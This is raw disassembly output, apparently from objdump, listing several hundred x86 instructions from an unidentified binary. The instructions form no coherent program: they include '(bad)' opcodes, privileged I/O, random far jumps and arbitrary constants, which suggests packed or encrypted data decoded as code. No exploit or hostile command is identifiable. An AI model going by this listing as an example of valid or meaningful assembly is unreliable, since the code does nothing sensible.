  416cf6:	and    eax,0x41dd0f6
  416cfb:	push   cs
  416cfc:	pop    ebx
  416cfd:	lahf   
  416cfe:	stos   DWORD PTR es:[edi],eax
  416cff:	into   
  416d00:	retf   0x6d59
  416d03:	shl    ebp,0xde
  416d06:	lods   eax,DWORD PTR ds:[esi]
  416d07:	outs   dx,DWORD PTR ds:[esi]
  416d08:	rcr    ebx,cl
  416d0a:	pop    ebp
  416d0b:	out    0x7d,eax
  416d0d:	push   cs
  416d0e:	push   cs
  416d0f:	lds    ebx,FWORD PTR [eax-0x4ab764b5]
  416d15:	jno    0x416ccb
  416d17:	mov    ebx,0x2ae4bb54
  416d1c:	shr    al,0x4b
  416d1f:	push   esi
  416d20:	jle    0x416ce3
  416d22:	jecxz  0x416cd6
  416d24:	cli    
  416d25:	and    DWORD PTR [ecx],edx
  416d27:	cmp    eax,0xf8992ada
  416d2c:	rcl    BYTE PTR [esi+edx*4-0x31],0x4c
  416d31:	push   0xffffff88
  416d33:	jmp    0x416d7f
  416d35:	or     DWORD PTR [eax],ecx
  416d37:	into   
  416d38:	jns    0x416db9
  416d3a:	xor    DWORD PTR [ecx],ebp
  416d3c:	cmp    eax,0x7f6d60a
  416d41:	scas   al,BYTE PTR es:[edi]
  416d42:	out    0xe5,eax
  416d44:	push   cs
  416d45:	int    0x68
  416d47:	jae    0x416d43
  416d49:	retf   0x1da6
  416d4c:	cmp    esi,DWORD PTR [edx+0x456c94cb]
  416d52:	test   BYTE PTR [esi+0x11],bh
  416d55:	mov    edx,0x89918e8e
  416d5a:	out    dx,eax
  416d5b:	add    al,0x92
  416d5d:	jne    0x416d0e
  416d5f:	xlat   BYTE PTR ds:[ebx]
  416d60:	out    0x26,al
  416d62:	jae    0x416d47
  416d64:	(bad)  
  416d65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d66:	fisubr WORD PTR [esi+eiz*8]
  416d69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d6a:	dec    esi
  416d6b:	add    DWORD PTR [edx-0x20ff132c],edx
  416d71:	aam    0xd6
  416d73:	cwde   
  416d74:	cmp    al,0xff
  416d76:	push   0xf9452d8c
  416d7b:	add    ebp,esp
  416d7d:	inc    ebx
  416d7e:	ror    BYTE PTR [edx-0x1b],cl
  416d81:	xlat   BYTE PTR ds:[ebx]
  416d82:	and    DWORD PTR [edi-0x53713863],ebx
  416d88:	jp     0x416d7f
  416d8a:	gs call 0x9aac7624
  416d90:	jno    0x416df0
  416d92:	repz daa 
  416d94:	outs   dx,DWORD PTR ds:[esi]
  416d95:	jmp    0x4f1a:0x137f69ad
  416d9c:	retf   0xdb4d
  416d9f:	mov    ah,0xdf
  416da1:	adc    bl,BYTE PTR [edx]
  416da3:	fbstp  TBYTE PTR [ebp+0x2b0efc04]
  416da9:	cdq    
  416daa:	out    0xfc,al
  416dac:	(bad)  
  416dad:	ja     0x416d34
  416daf:	loopne 0x416d7c
  416db1:	stc    
  416db2:	cmp    BYTE PTR [ecx],0x87
  416db5:	and    eax,0x9444c19b
  416dba:	sbb    ah,0xea
  416dbd:	aad    0x5d
  416dbf:	adc    eax,0x1f
  416dc2:	icebp  
  416dc3:	pop    ss
  416dc4:	mov    ds:0xad9eebae,eax
  416dc9:	mov    ebp,0xdbc73514
  416dce:	stos   DWORD PTR es:[edi],eax
  416dcf:	dec    eax
  416dd0:	repz sbb esi,ebp
  416dd3:	sub    dh,BYTE PTR [ebx-0x1f]
  416dd6:	xchg   ecx,eax
  416dd7:	mov    BYTE PTR [eax],dl
  416dd9:	mov    ah,0xb
  416ddb:	loope  0x416e1a
  416ddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dde:	push   edi
  416ddf:	sbb    BYTE PTR [esi],dh
  416de1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416de2:	and    bh,BYTE PTR [esi-0x54]
  416de5:	sti    
  416de6:	dec    edx
  416de7:	loope  0x416e43
  416de9:	push   es
  416dea:	frstpm(287 only) 
  416dec:	xlat   BYTE PTR ds:[ebx]
  416ded:	mov    dh,0x10
  416def:	or     DWORD PTR [edi+0x2a],eax
  416df2:	ret    
  416df3:	fist   WORD PTR [ebp+0x8]
  416df6:	mov    WORD PTR [edx+0x3af5ae67],ds
  416dfc:	jo     0x416de2
  416dfe:	dec    edi
  416dff:	scas   al,BYTE PTR es:[edi]
  416e00:	sbb    bh,BYTE PTR [bx+di-0x802]
  416e05:	call   0xfbcb:0xb37015f2
  416e0c:	push   edx
  416e0d:	push   esp
  416e0e:	xlat   BYTE PTR ds:[ebx]
  416e0f:	fidiv  DWORD PTR [ecx+0x7ed9d0c1]
  416e15:	sub    eax,0x77bb24a8
  416e1a:	loope  0x416e0a
  416e1c:	sbb    BYTE PTR [eax-0x69],dh
  416e1f:	mov    ds:0x55a90b3,eax
  416e24:	loopne 0x416df3
  416e26:	sub    cl,ah
  416e28:	xchg   ecx,eax
  416e29:	dec    edx
  416e2a:	sub    al,0x3a
  416e2c:	ret    
  416e2d:	pop    ss
  416e2e:	dec    esi
  416e2f:	jne    0x416e19
  416e31:	jb     0x416e23
  416e33:	adc    eax,0x982668a2
  416e38:	ret    
  416e39:	cmp    ah,BYTE PTR [edi+eiz*2+0xa]
  416e3d:	rol    bl,1
  416e3f:	xor    al,0xd5
  416e41:	gs arpl bp,si
  416e44:	loopne 0x416e22
  416e46:	jae    0x416ea4
  416e48:	scas   al,BYTE PTR es:[edi]
  416e49:	push   ecx
  416e4a:	fwait
  416e4b:	lock cmp cl,BYTE PTR [edx-0x64]
  416e4f:	ins    BYTE PTR es:[edi],dx
  416e50:	mov    eax,0xa4908a0d
  416e55:	(bad)  
  416e56:	cmp    eax,0x772134a8
  416e5b:	test   eax,0x152c14f3
  416e61:	mov    ebx,0x4d33d4ee
  416e66:	std    
  416e67:	cld    
  416e68:	stos   BYTE PTR es:[edi],al
  416e69:	rcr    DWORD PTR [esp+edx*1+0x532c6cf1],1
  416e70:	sbb    eax,0x2911bc32
  416e75:	enter  0x897e,0xbe
  416e79:	cdq    
  416e7a:	dec    ebx
  416e7b:	mov    bh,al
  416e7d:	inc    ebp
  416e7e:	(bad)  
  416e7f:	out    dx,al
  416e80:	imul   ebx,ebx,0xfa3ee665
  416e86:	jb     0x416efc
  416e88:	jne    0x416ee9
  416e8a:	inc    esp
  416e8b:	scas   eax,DWORD PTR es:[edi]
  416e8c:	inc    esp
  416e8d:	pop    edx
  416e8e:	and    BYTE PTR [ebx],bl
  416e90:	outs   dx,BYTE PTR ds:[esi]
  416e91:	jae    0x416e27
  416e93:	sub    BYTE PTR [edx+0x3ee9171b],cl
  416e99:	and    al,0x71
  416e9b:	push   edi
  416e9c:	sub    DWORD PTR [ebx+0x26],esi
  416e9f:	or     cl,BYTE PTR [esi+edi*2-0x1f]
  416ea3:	cmp    eax,0xd0ebcb41
  416ea8:	sub    DWORD PTR [esi+0x49],eax
  416eab:	adc    DWORD PTR [eax+0x4],esi
  416eae:	push   esp
  416eaf:	icebp  
  416eb0:	adc    esi,DWORD PTR [di-0x3b]
  416eb4:	(bad)  
  416eb5:	addr16 rcl ecx,0x17
  416eb9:	call   0x4c731b4f
  416ebe:	mov    edi,0x510547d2
  416ec3:	and    eax,0xf357e8fd
  416ec8:	or     eax,0xa3dc10f3
  416ecd:	js     0x416f4d
  416ecf:	retf   
  416ed0:	clc    
  416ed1:	dec    ebp
  416ed2:	loop   0x416e90
  416ed4:	retf   0x609a
  416ed7:	inc    edi
  416ed8:	es mov ebp,0xfb0c135b
  416ede:	jle    0x416f16
  416ee0:	mov    al,0xe5
  416ee2:	loope  0x416eb5
  416ee4:	cld    
  416ee5:	popa   
  416ee6:	dec    eax
  416ee7:	pop    ebp
  416ee8:	test   ah,0x4a
  416eeb:	adc    al,0xfb
  416eed:	and    DWORD PTR [esi-0x26f514c1],0xfffffff0
  416ef4:	mov    dh,dh
  416ef6:	mov    ah,0x40
  416ef8:	jmp    0xb338cbb6
  416efd:	ror    DWORD PTR [ecx],1
  416eff:	in     al,dx
  416f00:	mov    ebx,DWORD PTR [eax]
  416f02:	pop    ebx
  416f03:	mov    ebx,0x6edb1c19
  416f08:	xor    edx,DWORD PTR [eax+ebp*4-0x4571018e]
  416f0f:	push   ebx
  416f10:	push   esi
  416f11:	fnstenv [esi+0x43]
  416f14:	or     DWORD PTR [ebp+edx*4-0x68],0x6c
  416f19:	xchg   edx,eax
  416f1a:	mov    ah,0x64
  416f1c:	aam    0x50
  416f1e:	sub    al,BYTE PTR [esi+0x3c558acc]
  416f24:	sbb    eax,0x5f96a8f6
  416f29:	mov    ecx,0xdb791920
  416f2e:	and    ch,BYTE PTR [eax+esi*2+0x24]
  416f32:	outs   dx,DWORD PTR ds:[esi]
  416f33:	xor    BYTE PTR [edx],ah
  416f35:	mov    edx,0xa4fba933
  416f3a:	dec    edi
  416f3b:	push   eax
  416f3c:	jge    0x416f01
  416f3e:	sahf   
  416f3f:	xor    DWORD PTR ds:0x93a2b01a,esi
  416f45:	jae    0x416f72
  416f47:	jle    0x416f5f
  416f49:	xchg   ebp,eax
  416f4a:	jnp    0x416f21
  416f4c:	inc    ebx
  416f4d:	arpl   WORD PTR [ecx],sp
  416f4f:	in     eax,0x62
  416f51:	add    al,0x1f
  416f53:	dec    eax
  416f54:	imul   DWORD PTR [eax+0x73]
  416f57:	cmp    al,0x10
  416f59:	aam    0xaa
  416f5b:	and    BYTE PTR [ecx],0xb7
  416f5e:	mov    dl,0x92
  416f60:	mov    ds:0x18969fdd,eax
  416f65:	jno    0x416fc4
  416f67:	pop    ds
  416f68:	jg     0x416fdf
  416f6a:	push   cs
  416f6b:	cmp    BYTE PTR [ebx],0xb1
  416f6e:	mov    ds:0x7a380b8d,eax
  416f73:	icebp  
  416f74:	sbb    al,0xcd
  416f76:	jbe    0x416f28
  416f78:	or     DWORD PTR [esi+0x62768d4f],edi
  416f7e:	cwde   
  416f7f:	sahf   
  416f80:	out    dx,eax
  416f81:	inc    eax
  416f82:	(bad)  
  416f83:	test   eax,0x3a749211
  416f88:	mov    BYTE PTR [ebp-0x3f],0xfc
  416f8c:	sbb    ebx,DWORD PTR [edx+esi*8]
  416f8f:	lock fild QWORD PTR [esi-0x3d]
  416f93:	repz mov edi,0x4ff99469
  416f99:	out    dx,eax
  416f9a:	push   ds
  416f9b:	pop    ds
  416f9c:	mov    DWORD PTR [edi],0xcc4f4768
  416fa2:	pop    ebx
  416fa3:	loop   0x416f53
  416fa5:	outs   dx,DWORD PTR ds:[esi]
  416fa6:	fs push esp
  416fa8:	push   esi
  416fa9:	retf   0x4a32
  416fac:	mov    ah,0xf4
  416fae:	enter  0xa7d7,0x36
  416fb2:	nop
  416fb3:	into   
  416fb4:	ret    
  416fb5:	dec    ebp
  416fb6:	scas   al,BYTE PTR es:[edi]
  416fb7:	clc    
  416fb8:	out    dx,al
  416fb9:	push   ss
  416fba:	jecxz  0x416f65
  416fbc:	test   al,0x92
  416fbe:	xchg   ecx,eax
  416fbf:	mov    eax,ds:0xdd171035
  416fc4:	mov    BYTE PTR [edx+0x27c3df3f],bh
  416fca:	lahf   
  416fcb:	mov    BYTE PTR [ebp-0x39],dh
  416fce:	sub    DWORD PTR [esp+eax*1],eax
  416fd1:	xor    eax,0x453a38d9
  416fd6:	cmp    al,0x55
  416fd8:	hlt    
  416fd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fda:	retf   
  416fdb:	lods   eax,DWORD PTR ds:[esi]
  416fdc:	mov    dh,0x97
  416fde:	jmp    0x416fa6
  416fe0:	fld    TBYTE PTR [edi]
  416fe2:	hlt    
  416fe3:	cmc    
  416fe4:	cdq    
  416fe5:	sub    DWORD PTR [ecx+0x59],edi
  416fe8:	imul   ebp,DWORD PTR [ecx-0x48abb0c3],0x51
  416fef:	popf   
  416ff0:	push   ds
  416ff1:	test   eax,0xd8d36f96
  416ff6:	cmp    bl,BYTE PTR [ecx+0x4fa85aa2]
  416ffc:	sub    dh,al
  416ffe:	add    al,BYTE PTR [ecx+0x241aaebe]
  417004:	adc    eax,0xb4c288a5
  417009:	inc    ebx
  41700a:	lods   al,BYTE PTR ds:[esi]
  41700b:	outs   dx,DWORD PTR ds:[esi]
  41700c:	mov    ?,esi
  41700e:	and    BYTE PTR [edi+0x70b8b33a],dh
  417014:	and    BYTE PTR [edx+0x1dcc6c65],cl
  41701a:	ja     0x417042
  41701c:	jne    0x417020
  41701e:	and    ah,BYTE PTR [edx]
  417020:	dec    esi
  417021:	jmp    0x6036:0x50717762
  417028:	jmp    0x5f9a2daf
  41702d:	inc    ecx
  41702e:	inc    edi
  41702f:	(bad)  
  417030:	outs   dx,DWORD PTR ds:[esi]
  417031:	inc    edi
  417032:	add    cl,BYTE PTR [ebp+edi*4+0x5750d4a3]
  417039:	xchg   edi,eax
  41703a:	mov    ebp,0x673cd869
  41703f:	dec    esp
  417040:	xchg   BYTE PTR [eax+0x13facf88],bh
  417046:	sub    edx,eax
  417048:	inc    esi
  417049:	sahf   
  41704a:	adc    DWORD PTR [ecx],0x29
  41704d:	fmulp  st(5),st
  41704f:	jmp    0x90bc4b25
  417054:	push   ecx
  417055:	loope  0x41700f
  417057:	mov    edx,0x52a2efe6
  41705c:	adc    DWORD PTR [ebp-0x13c17e54],ebp
  417062:	adc    BYTE PTR [ecx],bh
  417064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417065:	mov    eax,ds:0xeb2b3bae
  41706a:	aas    
  41706b:	jnp    0x4170e1
  41706d:	ins    BYTE PTR es:[edi],dx
  41706e:	shl    eax,1
  417070:	lea    ebx,[eax-0x24dca9b9]
  417076:	add    eax,DWORD PTR [edx]
  417078:	adc    BYTE PTR [ebp-0x40],dl
  41707b:	test   BYTE PTR gs:[esp+eiz*4],cl
  41707f:	xlat   BYTE PTR ds:[ebx]
  417080:	add    DWORD PTR [eax],edi
  417082:	enter  0x66df,0xf0
  417086:	adc    BYTE PTR [eax],ch
  417088:	inc    eax
  417089:	xchg   edx,eax
  41708a:	test   DWORD PTR [ebp*2-0x25d5cbc7],eax
  417091:	adc    al,0xe0
  417093:	inc    edi
  417094:	fistp  QWORD PTR [edx+0x4ea0abbe]
  41709a:	cmc    
  41709b:	add    eax,0xc1b6a8dd
  4170a0:	sbb    ch,BYTE PTR [eax-0x7b]
  4170a3:	pop    ds
  4170a4:	xor    eax,0x9aa1121b
  4170a9:	and    DWORD PTR [edi-0x15],0x415e22ab
  4170b0:	cmp    DWORD PTR [eax+0x17d7837e],ebp
  4170b6:	adc    eax,0x9c7e3a2d
  4170bb:	lahf   
  4170bc:	mov    cl,BYTE PTR [edx-0x38]
  4170bf:	xchg   ebx,eax
  4170c0:	or     BYTE PTR [edi-0x700af82d],dh
  4170c6:	or     ebx,DWORD PTR [edx-0x4e5fdf10]
  4170cc:	jecxz  0x417137
  4170ce:	inc    edx
  4170cf:	jns    0x41714a
  4170d1:	sti    
  4170d2:	ja     0x417127
  4170d4:	xchg   esi,eax
  4170d5:	add    al,0xe8
  4170d7:	retf   0x8200
  4170da:	mov    ah,0x4a
  4170dc:	fisub  DWORD PTR [ecx]
  4170de:	sbb    al,0x67
  4170e0:	into   
  4170e1:	xor    edi,DWORD PTR [edi]
  4170e3:	or     ch,dl
  4170e5:	sbb    eax,0xfe502e02
  4170ea:	not    BYTE PTR es:[ecx]
  4170ed:	jp     0x417121
  4170ef:	inc    edi
  4170f0:	push   ecx
  4170f1:	xchg   DWORD PTR [edi],ebx
  4170f3:	dec    ebp
  4170f4:	add    eax,0x233e2da5
  4170f9:	(bad)  
  4170fa:	outs   dx,DWORD PTR ds:[esi]
  4170fb:	test   DWORD PTR [ebx],ecx
  4170fd:	push   ebp
  4170fe:	out    0x6b,eax
  417100:	fcomp  DWORD PTR [ecx]
  417102:	and    eax,DWORD PTR [ebp+0x71]
  417105:	dec    edx
  417106:	pop    ecx
  417107:	ja     0x417184
  417109:	cmp    dl,BYTE PTR [eax]
  41710b:	stc    
  41710c:	adc    al,0x4e
  41710e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41710f:	ja     0x41710a
  417111:	js     0x4170e4
  417113:	mov    ch,0x57
  417115:	outs   dx,DWORD PTR ds:[esi]
  417116:	call   0xbfa6f418
  41711b:	sbb    eax,0x5d5a7fe3
  417120:	retf   0x6dc8
  417123:	and    esi,DWORD PTR [esi-0x1da7548f]
  417129:	push   0x0
  41712b:	jg     0x4170d9
  41712d:	test   esp,ebp
  41712f:	jl     0x417190
  417131:	dec    edx
  417132:	push   edi
  417133:	imul   esp,DWORD PTR [esi-0x12],0x71f6fbc2
  41713a:	mov    fs,esi
  41713c:	stos   BYTE PTR es:[edi],al
  41713d:	iret   
  41713e:	dec    ebx
  41713f:	inc    edx
  417140:	jecxz  0x4170c8
  417142:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417143:	cmp    al,0x5c
  417145:	push   edx
  417146:	sbb    dl,bh
  417148:	sbb    bl,al
  41714a:	sbb    ebx,DWORD PTR [esi+eax*4-0x37]
  41714e:	(bad)  
  41714f:	xlat   BYTE PTR ds:[ebx]
  417150:	fld    TBYTE PTR [edi-0x428aa8bd]
  417156:	imul   DWORD PTR ds:0x53f572de
  41715c:	(bad)  
  41715d:	test   eax,0xce996907
  417162:	enter  0xbe1c,0x4a
  417166:	cli    
  417167:	dec    esp
  417168:	xor    al,BYTE PTR [ecx+ecx*8]
  41716b:	clc    
  41716c:	jns    0x41713d
  41716e:	test   DWORD PTR [ebp-0x5],edx
  417171:	inc    ebx
  417172:	xor    dh,al
  417174:	pop    esi
  417175:	pop    es
  417176:	stos   DWORD PTR es:[edi],eax
  417177:	ins    BYTE PTR es:[edi],dx
  417178:	jg     0x417175
  41717a:	sbb    edi,DWORD PTR [esi+0x54]
  41717d:	push   ebp
  41717e:	mov    edx,0x253d4ac7
  417183:	add    BYTE PTR [ebx],bh
  417185:	xor    bl,BYTE PTR [ecx+0x48]
  417188:	dec    ecx
  417189:	imul   edi,DWORD PTR [edi-0x8],0x56
  41718d:	xlat   BYTE PTR ds:[ebx]
  41718e:	add    bh,al
  417190:	(bad)  
  417191:	fld    DWORD PTR [esi-0x44]
  417194:	mov    ebp,0x4875a225
  417199:	jecxz  0x417128
  41719b:	dec    ebp
  41719c:	xor    bh,BYTE PTR [ecx+0x6385cba9]
  4171a2:	(bad)  
  4171a3:	push   edi
  4171a4:	scas   al,BYTE PTR es:[edi]
  4171a5:	aaa    
  4171a6:	mov    ch,0xb5
  4171a8:	dec    ebp
  4171a9:	in     eax,dx
  4171aa:	xor    ecx,ecx
  4171ac:	sub    edi,DWORD PTR [ebx-0x30]
  4171af:	aad    0x8f
  4171b1:	outs   dx,BYTE PTR ds:[esi]
  4171b2:	jmp    0xd1fca082
  4171b7:	test   eax,0x3514b582
  4171bc:	leave  
  4171bd:	pop    ss
  4171be:	inc    ebx
  4171bf:	in     eax,0xaf
  4171c1:	lock pop ss
  4171c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171c4:	adc    al,0xf2
  4171c6:	push   eax
  4171c7:	lods   al,BYTE PTR ds:[esi]
  4171c8:	add    edi,ebx
  4171ca:	les    ecx,FWORD PTR [ebx-0x3b111b8]
  4171d0:	xor    DWORD PTR [esi+edx*8-0x7f2c0acd],0xef9a13f2
  4171db:	jecxz  0x4171ee
  4171dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171de:	mov    edi,0x43c913d9
  4171e3:	xchg   edx,eax
  4171e4:	rol    BYTE PTR [edi],cl
  4171e6:	xor    BYTE PTR [esp+edi*1+0x50a2b3dd],al
  4171ed:	mov    ds:0x205d899d,al
  4171f2:	dec    ecx
  4171f3:	paddusb mm4,QWORD PTR [eax]
  4171f6:	add    BYTE PTR [ebx+eiz*4-0x849b9f6],bh
  4171fd:	xchg   ecx,eax
  4171fe:	mov    dh,bh
  417200:	ss jecxz 0x41722a
  417203:	inc    edx
  417204:	and    DWORD PTR [edi+0x6],eax
  417207:	push   esp
  417208:	aam    0x7c
  41720a:	test   DWORD PTR [esi+0x17],esi
  41720d:	ja     0x417235
  41720f:	in     al,dx
  417210:	cmc    
  417211:	adc    BYTE PTR [eax],ah
  417213:	dec    edx
  417214:	ins    DWORD PTR es:[edi],dx
  417215:	fisttp WORD PTR [edx-0x67]
  417218:	inc    ecx
  417219:	pop    edx
  41721a:	jnp    0x4171e5
  41721c:	(bad)  
  41721d:	mov    cl,0xe6
  41721f:	adc    al,0x33
  417221:	lea    edx,[esi+0x7cb5facd]
  417227:	push   ecx
  417228:	sbb    DWORD PTR ds:[esi-0x2ba7bf03],ebx
  41722f:	mov    ah,0xc6
  417231:	dec    ecx
  417232:	fist   DWORD PTR [eax-0x71]
  417235:	pusha  
  417236:	sub    al,0xed
  417238:	jae    0x41722a
  41723a:	repnz mov ebp,ds
  41723d:	jo     0x4171c3
  41723f:	cmc    
  417240:	arpl   WORD PTR [esp+edi*2-0x45],di
  417244:	adc    eax,0x27
  417247:	xchg   ecx,eax
  417248:	cmp    ebp,DWORD PTR [esi-0x57615eb3]
  41724e:	and    edi,DWORD PTR [edi]
  417250:	xchg   ah,bh
  417252:	mov    DWORD PTR [eax-0x1e339585],esp
  417258:	cmp    edx,DWORD PTR ds:0x1fbb2981
  41725e:	jb     0x41729c
  417260:	add    al,0xca
  417262:	stos   BYTE PTR es:[edi],al
  417263:	cwde   
  417264:	mov    edx,0xc7147504
  417269:	sub    al,dl
  41726b:	xlat   BYTE PTR ds:[ebx]
  41726c:	cmc    
  41726d:	stc    
  41726e:	repnz cmp BYTE PTR [edx-0x5e43168d],0xe2
  417276:	shl    ecx,0x8e
  417279:	bound  ebx,QWORD PTR [edi]
  41727b:	sub    al,0x8
  41727d:	ret    
  41727e:	adc    dh,ch
  417280:	xlat   BYTE PTR ds:[ebx]
  417281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417282:	bound  esp,QWORD PTR [esi]
  417284:	sub    BYTE PTR [ecx+0x51c66b85],bh
  41728a:	or     al,0x42
  41728c:	je     0x417220
  41728e:	pop    edi
  41728f:	int3   
  417290:	or     eax,0xd363c9ab
  417295:	cmp    eax,0x276bbb7a
  41729a:	add    eax,0x87f3762b
  41729f:	sbb    eax,0x36ab7735
  4172a4:	jge    0x41729b
  4172a6:	xchg   edi,eax
  4172a7:	iret   
  4172a8:	packsswb mm2,QWORD PTR [esi-0x2a]
  4172ac:	or     al,0x48
  4172ae:	call   0xd78c:0x5ff6c64
  4172b5:	mov    esi,0xb2b8da49
  4172ba:	data16 cmp al,0xd0
  4172bd:	ja     0x417278
  4172bf:	or     cl,BYTE PTR [ebx+0xa94cfd4]
  4172c5:	retf   0xa093
  4172c8:	mov    ds:0x8e2f61d4,al
  4172cd:	pop    edi
  4172ce:	xlat   BYTE PTR ds:[ebx]
  4172cf:	aaa    
  4172d0:	xchg   edi,eax
  4172d1:	adc    cl,BYTE PTR [ebp-0x54f14960]
  4172d7:	jle    0x4172df
  4172d9:	sbb    BYTE PTR [ebp+0x22],0x84
  4172dd:	loop   0x4172dd
  4172df:	leave  
  4172e0:	fsub   QWORD PTR [ebp+0x7c849a7]
  4172e6:	inc    ecx
  4172e7:	cdq    
  4172e8:	push   ebp
  4172e9:	push   edi
  4172ea:	jns    0x4172b5
  4172ec:	jmp    0x41727c
  4172ee:	mov    dl,0x16
  4172f0:	adc    edx,DWORD PTR [edi+esi*2+0x2f]
  4172f4:	fs mov ah,0x30
  4172f7:	dec    edi
  4172f8:	add    DWORD PTR [esi],edx
  4172fa:	push   0x277b291c
  4172ff:	out    0x48,eax
  417301:	mov    ah,0xe4
  417303:	call   0x94cb:0xaa93cf6d
  41730a:	sbb    al,0x86
  41730c:	mov    esi,0x181b5ecf
  417311:	or     al,0xbe
  417313:	lds    ebp,FWORD PTR [edx-0x9]
  417316:	and    BYTE PTR [edx-0x1c66daee],bh
  41731c:	(bad)  
  41731d:	loopne 0x41730c
  41731f:	nop
  417320:	mov    esp,DWORD PTR [esi-0x16]
  417323:	sbb    bl,al
  417325:	(bad)
  417329:	jmp    0x1bcda14b
  41732e:	fdivrp st(0),st
  417330:	xor    BYTE PTR [ecx-0x51520fd4],bl
  417336:	cmp    al,0x13
  417338:	or     al,0x9
  41733a:	cld    
  41733b:	sbb    DWORD PTR [ebp-0x712682df],0x20
  417342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417343:	inc    ebp
  417344:	std    
  417345:	iret   
  417346:	xchg   BYTE PTR [ebp-0x6e4fbb84],dl
  41734c:	das    
  41734d:	pop    es
  41734e:	dec    ebx
  41734f:	adc    DWORD PTR [esi],ecx
  417351:	aaa    
  417352:	in     eax,dx
  417353:	repz lahf 
  417355:	shl    DWORD PTR [eax-0x266b37ad],cl
  41735b:	(bad)  
  41735c:	(bad)  
  41735d:	rcl    DWORD PTR [ecx+0x43],1
  417360:	mov    al,BYTE PTR [ebp+0x60]
  417363:	retf   0x60ad
  417366:	or     eax,0x960b2b5
  41736b:	cmp    edi,eax
  41736d:	adc    ch,cl
  41736f:	dec    esp
  417370:	fnstsw WORD PTR [ecx+0x76]
  417373:	sahf   
  417374:	out    0xd3,eax
  417376:	imul   ebp,DWORD PTR [ebx],0xffffffcf
  417379:	nop
  41737a:	xor    BYTE PTR [esi+0x3],bh
  41737d:	clc    
  41737e:	lea    esp,[edx+0x17]
  417381:	cld    
  417382:	arpl   WORD PTR [edi+0x2a838a85],bp
  417388:	push   es
  417389:	retf   
  41738a:	aaa    
  41738b:	jne    0x417352
  41738d:	sbb    DWORD PTR [edi-0x1],0x9b9e1a39
  417394:	mov    es,WORD PTR [esi]
  417396:	fnstcw WORD PTR [ebp+0x3e]
  417399:	inc    edi
  41739a:	ins    BYTE PTR es:[edi],dx
  41739b:	mov    dl,0x1e
  41739d:	mov    bh,0x65
  41739f:	add    bh,BYTE PTR [eax]
  4173a1:	inc    ecx
  4173a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173a3:	adc    BYTE PTR [edi+eax*1+0x1a8cd7da],dh
  4173aa:	jo     0x4173f8
  4173ac:	and    bl,0xaa
  4173af:	scas   al,BYTE PTR es:[edi]
  4173b0:	or     DWORD PTR [eax+0x1d],esp
  4173b3:	ret    0x8748
  4173b6:	sti    
  4173b7:	test   cl,bh
  4173b9:	rcl    DWORD PTR [ecx+0x67803fe3],0xd1
  4173c0:	mov    ebx,0xd953c52f
  4173c5:	dec    edx
  4173c6:	rcr    ch,1
  4173c8:	fadd   st,st(5)
  4173ca:	xchg   ebp,eax
  4173cc:	push   0xffffffe1
  4173ce:	pop    ds
  4173cf:	adc    BYTE PTR [edx],cl
  4173d1:	aaa    
  4173d2:	pusha  
  4173d3:	xchg   esp,eax
  4173d4:	sub    ebp,0x99570642
  4173da:	imul   ebp,DWORD PTR es:[eax+esi*4+0x3bc23bf8],0x9d232b91
  4173e6:	jb     0x417376
  4173e8:	addr16 push esp
  4173ea:	ret    
  4173eb:	leave  
  4173ec:	test   al,0x50
  4173ee:	cldemote BYTE PTR [edx+0x7a]
  4173f2:	icebp  
  4173f3:	lock inc esp
  4173f5:	add    ah,ch
  4173f7:	and    al,0xa4
  4173f9:	popf   
  4173fa:	ret    0x1ed8
  4173fd:	cld    
  4173fe:	mov    WORD PTR [edi+edx*1-0x69072352],gs
  417405:	lock xchg ebp,eax
  417407:	add    esi,DWORD PTR gs:[ebx+0x1479d85c]
  41740e:	mov    al,0x5b
  417410:	adc    edx,DWORD PTR [ecx]
  417412:	ror    DWORD PTR [eax+0x3f],0x14
  417416:	in     eax,dx
  417417:	cld    
  417418:	mov    BYTE PTR [ecx],ah
  41741a:	jmp    0x5d85:0x27598c08
  417421:	sbb    eax,0xf4b520f5
  417426:	mov    dl,0x95
  417428:	les    edx,FWORD PTR [eax]
  41742a:	es pop ss
  41742c:	dec    ecx
  41742d:	jns    0x41740b
  41742f:	inc    ebp
  417430:	sti    
  417431:	jge    0x4174ae
  417433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417434:	fs in  eax,dx
  417436:	push   ss
  417437:	clc    
  417438:	popa   
  417439:	and    al,0xbf
  41743b:	push   edx
  41743c:	test   eax,0x3c3c6dcd
  417441:	push   ecx
  417442:	aas    
  417443:	int3   
  417444:	ins    DWORD PTR es:[edi],dx
  417445:	repz adc DWORD PTR [eax-0x7f],edi
  417449:	stos   BYTE PTR es:[edi],al
  41744a:	call   0xc1c4:0x2b97645b
  417451:	jge    0x4173db
  417453:	hlt    
  417454:	je     0x4174a3
  417456:	push   esp
  417457:	inc    ecx
  417458:	xor    BYTE PTR [ebp+0x1e],ah
  41745b:	jae    0x41743d
  41745d:	neg    DWORD PTR [ecx+0x15]
  417460:	int    0x5a
  417462:	pop    edi
  417463:	cdq    
  417464:	lock stos DWORD PTR es:[edi],eax
  417466:	mov    dh,0x75
  417468:	jno    0x417449
  41746a:	ret    0x15f8
  41746d:	push   es
  41746e:	pusha  
  41746f:	jecxz  0x417464
  417471:	or     eax,0xe9d6c950
  417476:	and    al,0x33
  417478:	or     ah,ch
  41747a:	bnd ja 0x4174c5
  41747d:	retf   
  41747e:	xchg   edi,eax
  41747f:	inc    edx
  417480:	jae    0x417408
  417482:	pop    esi
  417483:	sahf   
  417484:	test   BYTE PTR [edx-0x11f890ff],dl
  41748a:	ret    
  41748b:	xor    BYTE PTR [ebx+0x2672643f],ch
  417491:	stos   DWORD PTR es:[edi],eax
  417492:	aaa    
  417493:	jp     0x41746e
  417495:	stc    
  417496:	sub    esi,esi
  417498:	sahf   
  417499:	test   eax,0x196e9fe7
